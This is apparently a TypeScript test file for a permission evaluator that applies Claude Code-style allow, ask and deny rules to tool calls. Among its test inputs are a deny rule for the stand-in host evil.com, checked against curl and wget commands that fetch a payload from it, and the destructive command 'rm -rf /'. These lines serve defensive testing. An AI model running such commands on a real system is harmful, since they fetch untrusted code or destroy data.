/** Tests for Claude Code–compatible rule syntax in the evaluator. */

import { describe, it } from "node:test";
import assert from "node:assert/strict";

import {
  evaluate,
  normaliseStringRule,
  type PermissionPolicy,
  type EvaluationContext,
} from "../evaluate.ts";

void describe("Claude Code rule syntax", () => {
  void describe("exact matching", () => {
    void it("matches exact command string", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git status", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git status"), "allow");
      assert.equal(evaluate(policy, "bash", "git status --short"), "ask");
    });
  });

  void describe("prefix matching — word boundary", () => {
    void it("matches command equal to prefix", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git"), "allow");
    });

    void it("matches command starting with prefix + space", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "npm:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "npm run test"), "allow");
      assert.equal(evaluate(policy, "bash", "npm publish"), "allow");
    });

    void it("does not match without word boundary", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "ls:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "lsattr"), "ask");
      assert.equal(evaluate(policy, "bash", "lsof"), "ask");
    });
  });

  void describe("wildcard matching", () => {
    void it("matches * anywhere in pattern", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git commit *", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git commit -m test"), "allow");
    });

    void it("trailing * matches bare command too", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git *", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git"), "allow");
      assert.equal(evaluate(policy, "bash", "git add"), "allow");
      assert.equal(evaluate(policy, "bash", "git commit -m test"), "allow");
    });

    void it("matches *suffix pattern", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "* Dockerfile", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "cat Dockerfile"), "allow");
    });
  });

  void describe("bare tool matching (no pattern)", () => {
    void it("absent pattern matches any input for that tool", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "anything at all"), "allow");
    });
  });

  void describe("escape sequences", () => {
    void it("escaped parens in pattern become exact matches", () => {
      // Pattern contains escaped parens: git log \(main\)
      // Should match: git log (main)
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git log \\(main\\)", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git log (main)"), "allow");
      // Without parens, should not match
      assert.equal(evaluate(policy, "bash", "git log main"), "ask");
    });

    void it("escaped asterisk is literal, not wildcard", () => {
      // Pattern: echo \* → literal asterisk
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "echo \\*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "echo *"), "allow");
      // Unescaped wildcard would match anything after "echo "
      // But escaped * only matches literal *
      assert.equal(evaluate(policy, "bash", "echo hello"), "ask");
    });

    void it("escaped backslash is literal", () => {
      // Pattern: echo \\ → unescaped: echo \
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "echo \\\\", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "echo \\"), "allow");
    });
  });

  void describe("domain pattern", () => {
    void it("matches when input contains the domain", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "domain:evil.com", tier: "deny" }],
      };
      assert.equal(
        evaluate(policy, "bash", "curl https://evil.com/payload"),
        "deny",
      );
    });

    void it("matches domain as substring of hostname", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "domain:evil.com", tier: "deny" }],
      };
      assert.equal(evaluate(policy, "bash", "wget sub.evil.com/path"), "deny");
    });
  });

  void describe("MCP tool matching", () => {
    void it("matches entire MCP server", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "mcp__github", tier: "allow" }],
      };
      assert.equal(
        evaluate(policy, "mcp__github__create_issue", "{}"),
        "allow",
      );
      assert.equal(evaluate(policy, "mcp__github__list_prs", "{}"), "allow");
    });

    void it("matches MCP server wildcard", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "mcp__*__delete*", tier: "deny" }],
      };
      assert.equal(evaluate(policy, "mcp__github__delete_issue", "{}"), "deny");
      assert.equal(evaluate(policy, "mcp__jira__delete_ticket", "{}"), "deny");
    });
  });

  void describe("string rule normalisation", () => {
    void it("normalises bare tool name", () => {
      const rule = normaliseStringRule("Read", "allow");
      assert.deepStrictEqual(rule, { tool: "Read", tier: "allow" });
    });

    void it("normalises tool with pattern", () => {
      const rule = normaliseStringRule("Bash(git status)", "allow");
      assert.deepStrictEqual(rule, {
        tool: "Bash",
        pattern: "git status",
        tier: "allow",
      });
    });

    void it("normalises tool with prefix pattern", () => {
      const rule = normaliseStringRule("Bash(npm:*)", "deny");
      assert.deepStrictEqual(rule, {
        tool: "Bash",
        pattern: "npm:*",
        tier: "deny",
      });
    });

    void it("normalises empty parens as bare tool", () => {
      const rule = normaliseStringRule("Bash()", "allow");
      assert.deepStrictEqual(rule, { tool: "Bash", tier: "allow" });
    });

    void it("normalises star parens as bare tool", () => {
      const rule = normaliseStringRule("Bash(*)", "allow");
      assert.deepStrictEqual(rule, { tool: "Bash", tier: "allow" });
    });
  });
});

void describe("conditional rules", () => {
  void describe("basic matching", () => {
    void it("ask tier is checked before allow tier", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          { tool: "Bash", pattern: "npm run *", tier: "allow" },
          { tool: "Bash", pattern: "npm run build", tier: "ask" },
        ],
      };
      // deny-first: deny checked, then ask, then allow
      // "npm run build" matches ask tier → ask
      assert.equal(evaluate(policy, "bash", "npm run build"), "ask");
    });

    void it("falls through to defaultMode when no rule matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "npm:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "npm install"), "allow");
      assert.equal(evaluate(policy, "bash", "rm -rf /"), "ask");
    });

    void it("prefix pattern in conditional rule", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git status"), "allow");
      assert.equal(evaluate(policy, "bash", "npm install"), "ask");
    });

    void it("exact pattern in conditional rule", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git status", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git status"), "allow");
      assert.equal(evaluate(policy, "bash", "git status --short"), "ask");
    });
  });

  void describe("when conditions", () => {
    void it("matches when cwd condition matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          {
            tool: "Bash",
            pattern: "npm run *",
            tier: "allow",
            when: { cwd: "./packages/*" },
          },
        ],
      };
      const ctx: EvaluationContext = { cwd: "./packages/api" };
      assert.equal(evaluate(policy, "bash", "npm run test", ctx), "allow");

      const otherCtx: EvaluationContext = { cwd: "./scripts" };
      assert.equal(evaluate(policy, "bash", "npm run test", otherCtx), "ask");
    });

    void it("matches when branch condition matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          {
            tool: "Write",
            pattern: "./config/**",
            tier: "ask",
            when: { branch: "main" },
          },
        ],
      };
      const mainCtx: EvaluationContext = { branch: "main" };
      assert.equal(
        evaluate(policy, "write", "./config/app.yaml", mainCtx),
        "ask",
      );

      const featureCtx: EvaluationContext = { branch: "feature/test" };
      assert.equal(
        evaluate(policy, "write", "./config/app.yaml", featureCtx),
        "ask",
      );
    });

    void it("AND logic — all conditions must match", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          {
            tool: "Bash",
            pattern: "npm publish:*",
            tier: "deny",
            when: { cwd: "./packages/core", branch: "main" },
          },
        ],
      };
      // Both match
      assert.equal(
        evaluate(policy, "bash", "npm publish --access public", {
          cwd: "./packages/core",
          branch: "main",
        }),
        "deny",
      );

      // cwd doesn't match
      assert.equal(
        evaluate(policy, "bash", "npm publish --access public", {
          cwd: "./packages/utils",
          branch: "main",
        }),
        "ask",
      );
    });
  });
});
